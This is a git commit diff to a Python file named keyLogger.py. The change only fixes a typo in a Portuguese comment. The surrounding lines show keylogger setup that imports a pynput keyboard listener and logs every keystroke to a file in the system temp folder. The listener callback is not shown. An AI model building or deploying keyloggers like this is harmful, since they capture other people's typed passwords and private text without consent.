efff4baf7f31c7eef3cdfa3d55760a780e0fa1d2
LuizMosciaro <edu.mosciaro@live.com>
2022-07-29 22:42:30 -0400

    v1

--- keyLogger.py
+++ keyLogger.py
@@ -2,7 +2,7 @@ from pynput.keyboard import Listener
 import logging
 import tempfile
 
-#Cria um scrip na pasta temp da maquina e registra tudo que se clicou
+#Cria um script na pasta temp da maquina e registra tudo que se clicou
 logging.basicConfig(filename=(tempfile.gettempdir() + "\keylogs.txt"),
 	level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
